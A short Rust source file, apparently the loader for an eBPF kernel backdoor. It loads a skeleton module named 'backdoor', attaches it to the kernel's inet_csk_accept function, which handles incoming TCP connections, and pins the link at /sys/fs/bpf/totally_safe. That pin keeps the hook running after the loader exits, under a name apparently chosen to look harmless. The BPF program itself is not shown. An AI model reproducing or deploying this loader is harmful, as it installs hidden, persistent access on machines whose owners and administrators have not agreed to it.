// use anyhow::{bail, Result};
use color_eyre::Result;

// normal OUT_DIR approach doesn't work (https://github.com/rust-lang/rust/issues/66920)
#[path = "../target/backdoor.skel.rs"]
mod backdoor;
use backdoor::*;

fn main() -> Result<()> {
    if std::env::var("RUST_LIB_BACKTRACE").is_err() {
        std::env::set_var("RUST_LIB_BACKTRACE", "1")
    }
    color_eyre::install()?;
    let mut skel_builder = BackdoorSkelBuilder::default();
    skel_builder.obj_builder.debug(true);

    let open_skel = skel_builder.open()?;
    let mut skel = open_skel.load()?;
    skel.attach()?;
    skel.links
        .trace_inet_csk_accept
        .unwrap()
        .pin("/sys/fs/bpf/totally_safe")?;
    // let mut line = String::new();
    // std::io::stdin().read_line(&mut line)?;
    Ok(())
}
